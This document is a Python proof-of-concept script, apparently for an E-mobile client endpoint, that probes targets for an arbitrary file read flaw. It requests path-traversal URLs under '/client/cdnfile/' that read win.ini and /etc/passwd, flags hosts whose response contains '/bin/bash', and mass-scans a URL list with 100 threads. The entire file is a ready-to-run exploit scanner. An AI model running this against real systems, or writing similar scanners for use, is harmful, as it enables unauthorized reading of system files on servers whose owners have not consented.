import argparse
import requests
import os
import sys
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def banner():
    test = '''

  ______                      _     _ _             _ _            _       __     _        __ _ _          __
 |  ____|                    | |   (_) |           | (_)          | |     / /    | |      / _(_) |        / /
 | |__ ______ _ __ ___   ___ | |__  _| | ___    ___| |_  ___ _ __ | |_   / /__ __| |_ __ | |_ _| | ___   / / 
 |  __|______| '_ ` _ \ / _ \| '_ \| | |/ _ \  / __| | |/ _ \ '_ \| __| / / __/ _` | '_ \|  _| | |/ _ \ / /  
 | |____     | | | | | | (_) | |_) | | |  __/ | (__| | |  __/ | | | |_ / / (_| (_| | | | | | | | |  __// /   
 |______|    |_| |_| |_|\___/|_.__/|_|_|\___|  \___|_|_|\___|_| |_|\__/_/ \___\__,_|_| |_|_| |_|_|\___/_/                                                                                                                                                                                                                                                                                                                                                                                     
                                               author:sanhua
                                               date:2024-09-19
                                               version:1.0
    '''
    print(test)

def poc(target):
    if not target.startswith('http://') and not target.startswith('https://'):
        target = 'http://' + target

    payload = '/client/cdnfile/1C/Windows/win.ini'
    payload1 = '/client/cdnfile/C/etc/passwd'

    try:
        response = requests.get(url= target + payload, verify=False, timeout=5)
        if response.status_code == 200:
            res = requests.get(f'{target+payload1}', verify=False, timeout=5)
            if '/bin/bash' in res.text:
                print(f"[!] {target} 存在任意文件读取漏洞")
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write('target:存在任意文件读取漏洞')
            else:
                print(f"[!] {target} 不存在任意文件读取漏洞")
        else:
            print(f"[!] {target} 不存在任意文件读取漏洞")
    except Exception as e:
        result = f"[!] {target} 无法连接"
        logger.error(e)



def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="接口存在任意文件读取漏洞")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t 接口存在任意文件读取漏洞.py -h")

if __name__ == '__main__':
    main()
